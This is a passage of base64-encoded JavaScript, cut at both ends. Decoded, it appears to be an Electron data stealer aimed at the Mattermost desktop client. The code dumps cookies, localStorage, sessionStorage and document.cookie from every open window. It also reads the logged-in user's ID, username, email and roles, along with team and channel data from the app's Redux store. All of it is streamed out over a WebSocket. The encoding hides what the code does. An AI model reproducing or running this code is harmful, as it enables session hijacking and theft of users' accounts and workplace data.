dldFBhdGgobmFtZSk7CiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICAvLyBTa2lwIHVuYXZhaWxhYmxlIHBhdGhzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgIGFwcEluZm8ucGF0aEVycm9yID0gZXJyLm1lc3NhZ2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgSlNPTi5zdHJpbmdpZnkoYXBwSW5mbykpOwogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBFeHRyYWN0IEJyb3dzZXJXaW5kb3cgZGF0YQogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGV4dHJhY3RXaW5kb3dzRGF0YShzb2NrZXQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHsgQnJvd3NlcldpbmRvdyB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgICAgIGNvbnN0IHdpbmRvd3MgPSBCcm93c2VyV2luZG93LmdldEFsbFdpbmRvd3MoKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCB3aW5kb3dzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3Qgd2luID0gd2luZG93c1tpXTsKICAgICAgICAgICAgICAgICAgICBjb25zdCB3aW5EYXRhID0gewogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnd2luZG93X2RhdGEnLAogICAgICAgICAgICAgICAgICAgICAgICBpZDogd2luLmlkLAogICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogd2luLmdldFRpdGxlKCksCiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogd2luLndlYkNvbnRlbnRzPy5nZXRVUkwoKSwKICAgICAgICAgICAgICAgICAgICAgICAgYm91bmRzOiB3aW4uZ2V0Qm91bmRzKCksCiAgICAgICAgICAgICAgICAgICAgICAgIHdlYkNvbnRlbnRzSWQ6IHdpbi53ZWJDb250ZW50cz8uaWQKICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgSlNPTi5zdHJpbmdpZnkod2luRGF0YSkpOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC8vIEV4dHJhY3Qgd2ViIGNvbnRlbnRzCiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbi53ZWJDb250ZW50cykgewogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBleHRyYWN0V2ViQ29udGVudHNEYXRhKHNvY2tldCwgd2luLndlYkNvbnRlbnRzLCBpKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0hFQVAtRVhUUkFDVF0gV2luZG93IGV4dHJhY3Rpb24gZXJyb3I6JywgZXJyKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBFeHRyYWN0IFdlYkNvbnRlbnRzIGRhdGEKICAgICAgICBhc3luYyBmdW5jdGlvbiBleHRyYWN0V2ViQ29udGVudHNEYXRhKHNvY2tldCwgd2ViQ29udGVudHMsIHdpbmRvd0luZGV4KSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zdCB3Y0RhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgdHlwZTogJ3dlYl9jb250ZW50cycsCiAgICAgICAgICAgICAgICAgICAgaWQ6IHdlYkNvbnRlbnRzLmlkLAogICAgICAgICAgICAgICAgICAgIHdpbmRvd0luZGV4LAogICAgICAgICAgICAgICAgICAgIHVybDogd2ViQ29udGVudHMuZ2V0VVJMKCksCiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHdlYkNvbnRlbnRzLmdldFRpdGxlKCksCiAgICAgICAgICAgICAgICAgICAgdXNlckFnZW50OiB3ZWJDb250ZW50cy51c2VyQWdlbnQKICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIEdldCBoaXN0b3J5IGlmIGF2YWlsYWJsZQogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBpZiAod2ViQ29udGVudHMuaGlzdG9yeSkgewogICAgICAgICAgICAgICAgICAgICAgICB3Y0RhdGEuaGlzdG9yeSA9IHdlYkNvbnRlbnRzLmhpc3Rvcnk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge30KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBKU09OLnN0cmluZ2lmeSh3Y0RhdGEpKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gRXhlY3V0ZSBzY3JpcHQgaW4gcmVuZGVyZXIgdG8gZXh0cmFjdCBET00gc3RvcmFnZQogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBzdG9yYWdlRGF0YSA9IGF3YWl0IHdlYkNvbnRlbnRzLmV4ZWN1dGVKYXZhU2NyaXB0KGAKICAgICAgICAgICAgICAgICAgICAgICAgKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZGF0YSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2U6IHt9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlc3Npb25TdG9yYWdlOiB7fQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gRXh0cmFjdCBsb2NhbFN0b3JhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbG9jYWxTdG9yYWdlLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qga2V5ID0gbG9jYWxTdG9yYWdlLmtleShpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmxvY2FsU3RvcmFnZVtrZXldID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oa2V5KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEubG9jYWxTdG9yYWdlW2tleV0gPSAnW0Vycm9yOiAnICsgZS5tZXNzYWdlICsgJ10nOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gRXh0cmFjdCBzZXNzaW9uU3RvcmFnZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzZXNzaW9uU3RvcmFnZS5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGtleSA9IHNlc3Npb25TdG9yYWdlLmtleShpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnNlc3Npb25TdG9yYWdlW2tleV0gPSBzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKGtleSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnNlc3Npb25TdG9yYWdlW2tleV0gPSAnW0Vycm9yOiAnICsgZS5tZXNzYWdlICsgJ10nOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRhdGE7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pKCk7CiAgICAgICAgICAgICAgICAgICAgYCk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdkb21fc3RvcmFnZScsCiAgICAgICAgICAgICAgICAgICAgICAgIHdlYkNvbnRlbnRzSWQ6IHdlYkNvbnRlbnRzLmlkLAogICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3dJbmRleCwKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogc3RvcmFnZURhdGEKICAgICAgICAgICAgICAgICAgICB9KSk7CiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0hFQVAtRVhUUkFDVF0gU3RvcmFnZSBleHRyYWN0aW9uIGVycm9yOicsIGUpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tIRUFQLUVYVFJBQ1RdIFdlYkNvbnRlbnRzIGV4dHJhY3Rpb24gZXJyb3I6JywgZXJyKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBFeHRyYWN0IGNvb2tpZXMgYW5kIHNlc3Npb24gc3RvcmFnZQogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGV4dHJhY3RDb29raWVzQW5kU3RvcmFnZShzb2NrZXQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHsgc2Vzc2lvbiB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgICAgIGNvbnN0IGRlZmF1bHRTZXNzaW9uID0gc2Vzc2lvbi5kZWZhdWx0U2Vzc2lvbjsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKGRlZmF1bHRTZXNzaW9uKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gR2V0IGFsbCBjb29raWVzCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgY29va2llcyA9IGF3YWl0IGRlZmF1bHRTZXNzaW9uLmNvb2tpZXMuZ2V0KHt9KTsKICAgICAgICAgICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnY29va2llcycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb3VudDogY29va2llcy5sZW5ndGgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWVzCiAgICAgICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tIRUFQLUVYVFJBQ1RdIENvb2tpZSBleHRyYWN0aW9uIGVycm9yOicsIGUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAvLyBHZXQgc3RvcmFnZSB1c2FnZQogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHN0b3JhZ2VVc2FnZSA9IGF3YWl0IGRlZmF1bHRTZXNzaW9uLmdldFN0b3JhZ2VVc2FnZSgpOwogICAgICAgICAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdzdG9yYWdlX3VzYWdlJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzYWdlOiBzdG9yYWdlVXNhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gU3RvcmFnZSB1c2FnZSBtYXkgbm90IGJlIGF2YWlsYWJsZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSEVBUC1FWFRSQUNUXSBTZXNzaW9uIGV4dHJhY3Rpb24gZXJyb3I6JywgZXJyKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBFeHRyYWN0IGxvY2FsU3RvcmFnZSBkYXRhIChmb3IgbXVsdGlwbGUgcGFydGl0aW9ucykKICAgICAgICBhc3luYyBmdW5jdGlvbiBleHRyYWN0TG9jYWxTdG9yYWdlRGF0YShzb2NrZXQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHsgc2Vzc2lvbiB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgICAgIGNvbnN0IGRlZmF1bHRTZXNzaW9uID0gc2Vzc2lvbi5kZWZhdWx0U2Vzc2lvbjsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKCFkZWZhdWx0U2Vzc2lvbikgcmV0dXJuOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBFeGVjdXRlIHNjcmlwdCB0byBleHRyYWN0IGxvY2FsIHN0b3JhZ2UgaW4gbWFpbiBjb250ZXh0CiAgICAgICAgICAgICAgICBjb25zdCB7IEJyb3dzZXJXaW5kb3cgfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgICAgICAgICBjb25zdCB3aW5kb3dzID0gQnJvd3NlcldpbmRvdy5nZXRBbGxXaW5kb3dzKCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGZvciAoY29uc3Qgd2luIG9mIHdpbmRvd3MpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXdpbi53ZWJDb250ZW50cykgY29udGludWU7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAvLyBUcnkgdG8gZXh0cmFjdCBkb2N1bWVudC5jb29raWUKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRvY3VtZW50Q29va2llcyA9IGF3YWl0IHdpbi53ZWJDb250ZW50cy5leGVjdXRlSmF2YVNjcmlwdCgnZG9jdW1lbnQuY29va2llJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnRDb29raWVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdkb2N1bWVudF9jb29raWVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93SWQ6IHdpbi5pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiB3aW4ud2ViQ29udGVudHMuZ2V0VVJMKCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZXM6IGRvY3VtZW50Q29va2llcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gSWdub3JlIGVycm9ycwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAvLyBUcnkgdG8gZ2V0IG9yaWdpbiBpbmZvcm1hdGlvbgogICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgb3JpZ2luID0gYXdhaXQgd2luLndlYkNvbnRlbnRzLmV4ZWN1dGVKYXZhU2NyaXB0KCd3aW5kb3cubG9jYXRpb24ub3JpZ2luJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnb3JpZ2luJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3dJZDogd2luLmlkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9yaWdpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBJZ25vcmUgZXJyb3JzCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9IGNhdGNoICh3aW5FcnIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gU2tpcCBvbiBlcnJvcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSEVBUC1FWFRSQUNUXSBsb2NhbFN0b3JhZ2UgZXh0cmFjdGlvbiBlcnJvcjonLCBlcnIpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIEV4dHJhY3QgTWF0dGVybW9zdC1zcGVjaWZpYyBkYXRhCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gZXh0cmFjdE1hdHRlcm1vc3REYXRhKHNvY2tldCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgeyBCcm93c2VyV2luZG93IH0gPSByZXF1aXJlKCdlbGVjdHJvbicpOwogICAgICAgICAgICAgICAgY29uc3Qgd2luZG93cyA9IEJyb3dzZXJXaW5kb3cuZ2V0QWxsV2luZG93cygpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb3IgKGNvbnN0IHdpbiBvZiB3aW5kb3dzKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCF3aW4ud2ViQ29udGVudHMpIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIExvb2sgZm9yIE1hdHRlcm1vc3Qtc3BlY2lmaWMgZGF0YSBpbiB0aGUgd2luZG93IGNvbnRleHQKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgbWF0dGVybW9zdERhdGEgPSBhd2FpdCB3aW4ud2ViQ29udGVudHMuZXhlY3V0ZUphdmFTY3JpcHQoYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvdW5kOiBmYWxzZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RvcmU6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF1dGg6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXI6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlYW1zOiBudWxsLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFubmVsczogbnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gQ2hlY2sgZm9yIE1hdHRlcm1vc3QgZ2xvYmFsIG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93Lm1tX2NvbmZpZykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmZvdW5kID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5tbV9jb25maWcgPSB3aW5kb3cubW1fY29uZmlnOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93Lm1tX2N1cnJlbnRfdXNlcl9pZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmZvdW5kID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5tbV9jdXJyZW50X3VzZXJfaWQgPSB3aW5kb3cubW1fY3VycmVudF91c2VyX2lkOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBDaGVjayBmb3IgUmVkdXggc3RvcmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LnN0b3JlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEuZm91bmQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhdGUgPSB3aW5kb3cuc3RvcmUuZ2V0U3RhdGUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdGF0ZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIEV4dHJhY3QgYXV0aGVudGljYXRpb24gZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdGF0ZS5lbnRpdGllcyAmJiBzdGF0ZS5lbnRpdGllcy51c2VycykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmF1dGggPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50VXNlcklkOiBzdGF0ZS5lbnRpdGllcy51c2Vycy5jdXJyZW50VXNlcklkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvZmlsZXM6IHN0YXRlLmVudGl0aWVzLnVzZXJzLnByb2ZpbGVzID8gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmtleXMoc3RhdGUuZW50aXRpZXMudXNlcnMucHJvZmlsZXMpLmxlbmd0aCA6IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdGF0ZS5lbnRpdGllcy51c2Vycy5jdXJyZW50VXNlcklkICYmIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdGUuZW50aXRpZXMudXNlcnMucHJvZmlsZXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGN1cnJlbnRVc2VyID0gc3RhdGUuZW50aXRpZXMudXNlcnMucHJvZmlsZXNbc3RhdGUuZW50aXRpZXMudXNlcnMuY3VycmVudFVzZXJJZF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY3VycmVudFVzZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnVzZXIgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkOiBjdXJyZW50VXNlci5pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWU6IGN1cnJlbnRVc2VyLnVzZXJuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbWFpbDogY3VycmVudFVzZXIuZW1haWwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvbGVzOiBjdXJyZW50VXNlci5yb2xlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gRXh0cmFjdCB0ZWFtIGRhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3RhdGUuZW50aXRpZXMgJiYgc3RhdGUuZW50aXRpZXMudGVhbXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS50ZWFtcyA9IE9iamVjdC5rZXlzKHN0YXRlLmVudGl0aWVzLnRlYW1zLnRlYW1zIHx8IHt9KS5tYXAoaWQgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdGVhbSA9IHN0YXRlLmVudGl0aWVzLnRlYW1zLnRlYW1zW2lkXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IHRlYW0uaWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogdGVhbS5uYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlfbmFtZTogdGVhbS5kaXNwbGF5X25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBFeHRyYWN0IGNoYW5uZWwgZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdGF0ZS5lbnRpdGllcyAmJiBzdGF0ZS5lbnRpdGllcy5jaGFubmVscykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmNoYW5uZWxzID0gT2JqZWN0LmtleXMoc3RhdGUuZW50aXRpZXMuY2hhbm5lbHMuY2hhbm5lbHMgfHwge30pLmxlbmd0aDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEuc3RvcmVFcnJvciA9IGUubWVzc2FnZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAg